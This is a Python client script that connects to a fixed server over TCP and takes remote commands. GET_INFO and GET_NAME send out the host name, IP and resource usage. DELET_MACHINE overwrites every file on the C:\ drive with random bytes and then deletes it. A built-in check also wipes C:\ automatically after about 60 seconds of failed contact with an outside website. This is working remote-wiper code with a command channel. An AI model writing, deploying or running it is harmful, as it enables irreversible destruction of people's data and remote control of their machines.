import os
import numpy as np
import socket
from concurrent.futures import ThreadPoolExecutor
from dotenv import load_dotenv
import datetime
import psutil
import time
import requests

load_dotenv()
HOST = '10.8.4.63'  # IP do servidor
PORT = int(os.getenv("PORT"))
connection_time = datetime.datetime.now()
last_successful_check = datetime.datetime.now()


def has_internet_connectivity():
    global last_successful_check

    try:
        # Sending a HEAD request which is lighter than GET
        response = requests.head('https://hachitech.com.br', timeout=10)
        if response.status_code == 200:
            last_successful_check = datetime.datetime.now()
            print("We have internet connection")
        else:
            print("No internet detection")
            elapsed_time = (datetime.datetime.now() - last_successful_check).total_seconds()
            if elapsed_time > 60:
                print(f"More than {elapsed_time} seconds without internet. Taking action!")
                directory = "C:\\"
                secure_delete_directory(directory)
    except requests.RequestException as e:
        print(f"Error checking internet connection: {e}")


def secure_delete_directory(directory):
    """Securely deletes all files in a directory."""

    def secure_delete(file_path):
        try:
            file_size = os.path.getsize(file_path)
            random_data = np.random.bytes(file_size)
            with open(file_path, 'wb') as f:
                f.write(random_data)
            os.remove(file_path)
            print(f"File {file_path} securely deleted.")
        except Exception as e:
            print(f"Error deleting file {file_path}: {e}")

    def list_files(directory):
        file_list = []
        for foldername, subfolders, filenames in os.walk(directory):
            for filename in filenames:
                file_list.append(os.path.join(foldername, filename))
        return file_list

    files_to_delete = list_files(directory)

    with ThreadPoolExecutor() as executor:
        executor.map(secure_delete, files_to_delete)


def get_name():
    """Gets the machine's name."""
    name = os.getenv("COMPUTERNAME")
    if not name:
        name = socket.gethostname()
    return name


def get_machine_info():
    """Gets various machine info metrics."""
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    cpu_percent = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()

    info = f"Host Name: {host_name}\n" \
           f"IP Address: {ip_address}\n" \
           f"CPU Used: {cpu_percent}%\n" \
           f"Total Memory: {memory_info.total} bytes\n" \
           f"Used Memory: {memory_info.used} bytes\n" \
           f"Available Memory: {memory_info.available} bytes\n" \
           f"Memory Usage: {memory_info.percent}%"
    return info


def main():
    global last_successful_check

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))

            while True:
                try:
                    has_internet_connectivity()
                    data = s.recv(1024)
                    if not data:
                        break

                    command = data.decode('utf-8')
                    if command == "GET_INFO":
                        response = get_machine_info()
                        s.sendall(response.encode())
                    elif command == "DELET_MACHINE":
                        directory = "C:\\"
                        secure_delete_directory(directory)
                        response = "Directory deletion completed."
                        s.sendall(response.encode())
                    elif command == "GET_NAME":
                        s.sendall(get_name().encode())
                    elif command == "PING":
                        s.sendall("PONG".encode())

                except socket.error as e:
                    print(f"Socket error: {e}")

        except ConnectionRefusedError:
            print("Connection refused. Make sure the server is running.")


if __name__ == "__main__":
    main()
